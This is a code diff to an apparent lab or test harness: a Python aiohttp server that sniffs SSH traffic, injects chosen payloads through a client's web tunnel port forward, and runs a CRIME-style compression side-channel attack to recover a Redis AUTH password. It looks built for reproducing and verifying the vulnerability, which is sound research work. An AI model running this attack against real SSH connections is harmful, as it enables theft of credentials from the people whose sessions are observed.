@@ -14,8 +14,8 @@ Three things happen here:
      directly observable in the TCP segment that carries it.
 
   3. An aiohttp HTTP control API on :9000 lets the verification driver
-     query / clear the recorded packet log and trigger the client to
-     send things on either of its two SSH channels.
+     query / clear the recorded packet log, trigger the client to send
+     a Redis AUTH, and run the full attack.
 """
 
 import asyncio
@@ -39,6 +39,8 @@ SERVER_PORT = int(os.environ.get("SERVER_PORT", "22"))
 LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))
 HTTP_PORT = int(os.environ.get("HTTP_PORT", "9000"))
 CLIENT_CONTROL_URL = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
+CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
+WEB_TUNNEL_PORT = int(os.environ.get("WEB_TUNNEL_PORT", "8080"))
 
 SNIFF_FILTER = f"tcp and (port {SERVER_PORT} or port {LISTEN_PORT})"
 SNIFF_IFACE = os.environ.get("SNIFF_IFACE", "eth0")
@@ -197,14 +199,28 @@ async def handle_trigger_secret(request: web.Request) -> web.Response:
 
 
 async def handle_trigger_payload(request: web.Request) -> web.Response:
-    session: aiohttp.ClientSession = request.app["http"]
+    """Send a payload through the client's web tunnel port forward.
+
+    The attacker opens a TCP connection to client:8080 (the publicly
+    bound web tunnel) and writes the payload.  This data enters the
+    SSH tunnel as direct-tcpip channel data in the c->s direction.
+    """
     payload = await request.read()
-    async with session.post(
-        f"{CLIENT_CONTROL_URL}/send_attacker_payload",
-        data=payload,
-    ) as resp:
-        body = await resp.json()
-        return web.json_response({"ok": True, "client_response": body})
+    try:
+        reader, writer = await asyncio.open_connection(
+            CLIENT_HOST, WEB_TUNNEL_PORT,
+        )
+        writer.write(payload)
+        await writer.drain()
+        await asyncio.sleep(0.05)
+        writer.close()
+        await writer.wait_closed()
+    except Exception as exc:  # noqa: BLE001
+        LOG.exception("trigger_payload (tunnel) failed")
+        return web.json_response(
+            {"ok": False, "error": str(exc)}, status=500,
+        )
+    return web.json_response({"ok": True, "bytes_sent": len(payload)})
 
 
 async def handle_run_attack(request: web.Request) -> web.Response:
@@ -215,15 +231,18 @@ async def handle_run_attack(request: web.Request) -> web.Response:
             body = await request.json()
         except Exception:  # noqa: BLE001
             body = {}
-    known_prefix = body.get("known_prefix", "PASSWORD=").encode("utf-8")
+    known_prefix = body.get("known_prefix", "AUTH ").encode("utf-8")
     alphabet = body.get("alphabet", "abcdefghijklmnopqrstuvwxyz0123456789")
     max_length = int(body.get("max_length", 32))
-    noise_lengths = body.get("noise_lengths") or list(range(16))
-    settle = float(body.get("settle", 0.005))
+    noise_lengths = body.get("noise_lengths") or list(range(8))
+    settle = float(body.get("settle", 0.01))
     flush_bytes = int(body.get("flush_bytes", 33000))
+    min_margin = int(body.get("min_margin", 16))
+    max_rounds = int(body.get("max_rounds", 16))
 
-    LOG.info("HTTP /run_attack: prefix=%r alphabet_size=%d max=%d",
-             known_prefix, len(alphabet), max_length)
+    LOG.info("HTTP /run_attack: prefix=%r alphabet_size=%d max=%d "
+             "min_margin=%d max_rounds=%d",
+             known_prefix, len(alphabet), max_length, min_margin, max_rounds)
     try:
         result = await run_crime_attack(
             packet_log=PACKET_LOG,
@@ -233,6 +252,8 @@ async def handle_run_attack(request: web.Request) -> web.Response:
             noise_lengths=noise_lengths,
             settle=settle,
             flush_bytes=flush_bytes,
+            min_margin=min_margin,
+            max_rounds=max_rounds,
         )
     except Exception as exc:  # noqa: BLE001
         LOG.exception("attack failed")
